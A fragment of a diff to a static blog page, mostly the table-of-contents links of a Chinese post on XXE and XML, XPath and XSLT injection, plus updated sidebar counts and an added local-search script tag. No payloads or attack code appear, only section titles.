class="nav-text">XSLT 连接数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSLT-%20%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6"><span class="nav-number">1.8.7.</span> <span class="nav-text">XSLT 写入文件 </span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%99%AE%E9%80%9A%E5%AE%9E%E4%BD%93"><span class="nav-number">1.1.</span> <span class="nav-text">普通实体 </span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93%E5%A4%96%E9%83%A8%20-DTD"><span class="nav-number">1.2.</span> <span class="nav-text">参数实体外部 DTD</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%99%AE%E9%80%9A%E5%AE%9E%E4%BD%93%E5%A4%96%E9%83%A8%20-DTD"><span class="nav-number">1.3.</span> <span class="nav-text">普通实体外部 DTD</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Payload"><span class="nav-number">2.</span> <span class="nav-text">Payload</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#DOS"><span class="nav-number">2.1.</span> <span class="nav-text">DOS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF"><span class="nav-number">2.2.</span> <span class="nav-text">SSRF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE-%20%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.3.</span> <span class="nav-text">XXE 盲注 </span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">2.4.</span> <span class="nav-text">报错注入 </span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SOAP"><span class="nav-number">2.5.</span> <span class="nav-text">SOAP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%20-Payload"><span class="nav-number">3.</span> <span class="nav-text">其他 Payload</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-number">3.1.</span> <span class="nav-text">绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XML-%20%E6%B3%A8%E5%85%A5"><span class="nav-number">3.2.</span> <span class="nav-text">XML 注入 </span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XPath-%20%E6%B3%A8%E5%85%A5"><span class="nav-number">3.3.</span> <span class="nav-text">XPath 注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8"><span class="nav-number">3.3.1.</span> <span class="nav-text">盲注 </span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">3.3.1.1.</span> <span class="nav-text"> 布尔盲注 </span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#HTTP-%20%E5%A4%96%E5%B8%A6"><span class="nav-number">3.3.1.2.</span> <span class="nav-text">HTTP 外带 </span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DNS-%20%E5%A4%96%E5%B8%A6"><span class="nav-number">3.3.1.3.</span> <span class="nav-text">DNS 外带 </span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="nav-number">3.3.2.</span> <span class="nav-text">常用函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XPath-%20%E8%AF%AD%E6%B3%95%E9%80%9F%E6%9F%A5"><span class="nav-number">3.3.3.</span> <span class="nav-text">XPath 语法速查 </span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8A%82%E7%82%B9%E7%B1%BB%E5%9E%8B"><span class="nav-number">3.3.3.1.</span> <span class="nav-text">节点类型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="nav-number">3.3.3.2.</span> <span class="nav-text">表达式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%99%90%E5%AE%9A%E8%AF%AD"><span class="nav-number">3.3.3.3.</span> <span class="nav-text">限定语 </span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="nav-number">3.3.3.4.</span> <span class="nav-text">通配符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%9A%E8%B7%AF%E5%BE%84%E6%9F%A5%E8%AF%A2"><span class="nav-number">3.3.3.5.</span> <span class="nav-text">多路径查询</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XQuery-%20%E6%B3%A8%E5%85%A5"><span class="nav-number">3.4.</span> <span class="nav-text">XQuery 注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSD-%20%E6%B3%A8%E5%85%A5"><span class="nav-number">3.5.</span> <span class="nav-text">XSD 注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XSD-schemaLocation"><span class="nav-number">3.5.1.</span> <span class="nav-text">XSD schemaLocation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSD-noNamespaceSchemaLocation"><span class="nav-number">3.5.2.</span> <span class="nav-text">XSD noNamespaceSchemaLocation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSD-Include-import"><span class="nav-number">3.5.3.</span> <span class="nav-text">XSD Include&#x2F;import</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XInclude"><span class="nav-number">3.5.4.</span> <span class="nav-text">XInclude</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSD-%20%E6%8A%A5%E9%94%99"><span class="nav-number">3.5.5.</span> <span class="nav-text">XSD 报错</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSLT-%20%E6%B3%A8%E5%85%A5"><span class="nav-number">3.6.</span> <span class="nav-text">XSLT 注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%20-XSLT-%20%E4%BF%A1%E6%81%AF"><span class="nav-number">3.6.1.</span> <span class="nav-text">获取 XSLT 信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSLT-Stylesheet"><span class="nav-number">3.6.2.</span> <span class="nav-text">XSLT Stylesheet</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSLT-Include-import"><span class="nav-number">3.6.3.</span> <span class="nav-text">XSLT Include&#x2F;import</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSLT-%20%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-number">3.6.4.</span> <span class="nav-text">XSLT 读取文件 </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSLT-RCE"><span class="nav-number">3.6.5.</span> <span class="nav-text">XSLT RCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSLT-%20%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">3.6.6.</span> <span class="nav-text">XSLT 连接数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSLT-%20%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6"><span class="nav-number">3.6.7.</span> <span class="nav-text">XSLT 写入文件 </span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -560,20 +615,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">39</span>
+          <span class="site-state-item-count">36</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-count">9</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-count">16</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -649,6 +704,10 @@
   
 
 
+
+
+  
+<script src="/js/local-search.js"></script>
 
 
 
